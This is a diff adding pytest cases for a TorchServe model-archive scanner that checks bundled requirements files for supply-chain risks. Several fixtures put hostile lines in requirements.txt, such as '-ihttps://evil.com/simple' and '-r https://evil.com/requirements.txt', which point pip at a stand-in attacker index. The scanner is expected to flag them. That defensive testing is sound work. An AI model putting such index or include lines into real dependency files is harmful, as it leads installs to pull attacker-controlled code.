@@ -512,6 +512,29 @@ def test_scan_flags_non_pypi_requirements_short_index_option_as_critical(tmp_pat
     )
 
 
+def test_scan_flags_non_pypi_requirements_concatenated_short_index_option_as_critical(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"-ihttps://evil.com/simple\nnumpy==1.26.4\n",
+        },
+        filename="requirements_evil_index_concatenated_short.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
+    assert any(
+        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
 def test_scan_flags_editable_git_requirements_as_warning(tmp_path: Path) -> None:
     manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
     mar_path = _create_mar_archive(
@@ -580,11 +603,22 @@ def test_scan_flags_remote_find_links_equals_and_short_forms_as_warning(tmp_path
         },
         filename="requirements_find_links_short.mar",
     )
+    mar_concatenated_short_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"-fhttps://evil.com/simple\nnumpy==1.26.4\n",
+        },
+        filename="requirements_find_links_concatenated_short.mar",
+    )
 
     equals_result = TorchServeMarScanner().scan(str(mar_equals_path))
     short_result = TorchServeMarScanner().scan(str(mar_short_path))
+    concatenated_short_result = TorchServeMarScanner().scan(str(mar_concatenated_short_path))
 
-    for result in (equals_result, short_result):
+    for result in (equals_result, short_result, concatenated_short_result):
         requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
         assert len(requirements_failures) == 1
         reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
@@ -636,6 +670,76 @@ def test_scan_accepts_local_find_links_and_pypi_short_index(tmp_path: Path) -> N
     assert requirements_checks[0].status == CheckStatus.PASSED
 
 
+def test_scan_analyzes_local_included_requirements_files(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"-r extra.txt\n",
+            "extra.txt": b"--index-url=https://evil.com/simple\n",
+        },
+        filename="requirements_local_include.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
+    assert any(
+        finding["reason"] == "non_pypi_index_url" and finding["requirements_file"] == "extra.txt"
+        for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
+def test_scan_accepts_clean_local_included_requirements_files(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"-r extras/clean.txt\n",
+            "extras/clean.txt": b"numpy==1.26.4\n",
+        },
+        filename="requirements_clean_local_include.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_checks) == 1
+    assert requirements_checks[0].status == CheckStatus.PASSED
+
+
+def test_scan_flags_remote_requirements_include_as_warning(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"-r https://evil.com/requirements.txt\n",
+        },
+        filename="requirements_remote_include.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.WARNING
+    assert any(
+        finding["reason"] == "remote_requirements_include"
+        for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
 def test_scan_ignores_missing_index_url_value(tmp_path: Path) -> None:
     manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
     mar_path = _create_mar_archive(
@@ -677,7 +781,10 @@ def test_scan_bounds_requirements_reads_to_dedicated_limit(
     requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
 
     assert len(requirements_failures) == 1
-    assert "exceeds size limit" in requirements_failures[0].message
+    assert any(
+        finding["reason"] == "requirements_read_error" and "exceeds size limit" in finding["message"]
+        for finding in requirements_failures[0].details.get("findings", [])
+    )
 
 
 def test_scan_without_requirements_txt_preserves_existing_behavior(tmp_path: Path) -> None:
